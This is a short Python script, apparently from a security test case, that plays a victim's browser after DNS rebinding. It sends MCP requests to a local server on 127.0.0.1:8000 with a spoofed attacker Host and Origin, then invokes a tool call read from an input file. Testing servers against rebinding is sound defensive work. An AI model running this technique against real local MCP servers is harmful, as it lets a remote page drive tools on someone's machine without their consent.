"""Plays the victim's browser after a DNS rebind: a page on http://rebind.attacker.test:8000 whose name
now resolves to 127.0.0.1 sends MCP streamable-HTTP requests to the local server. The requests carry the
attacker's Host and Origin, exactly what a browser sends after the rebind. inputs/<arm>.json picks the tool call."""
import http.client
import json
import sys

arm, nonce = sys.argv[1], sys.argv[2]
spec = json.loads(open(f"/case/inputs/{arm}.json", encoding="utf-8").read().replace("{{NONCE}}", nonce))
base = {"Host": spec["host"], "Origin": spec["origin"], "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream"}
session = None


def post(msg):
    global session
    h = dict(base)
    if session:
        h["mcp-session-id"] = session
    c = http.client.HTTPConnection("127.0.0.1", 8000, timeout=20)
    c.request("POST", "/mcp", body=json.dumps(msg), headers=h)
    r = c.getresponse()
    session = r.getheader("mcp-session-id") or session
    body = r.read().decode("utf-8", "replace")
    print(msg.get("method"), r.status, body[:200].replace("\n", " "))
    return r.status


if post({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {
        "protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "page", "version": "0"}}}) == 200:
    post({"jsonrpc": "2.0", "method": "notifications/initialized"})
    post({"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": spec["call"]})
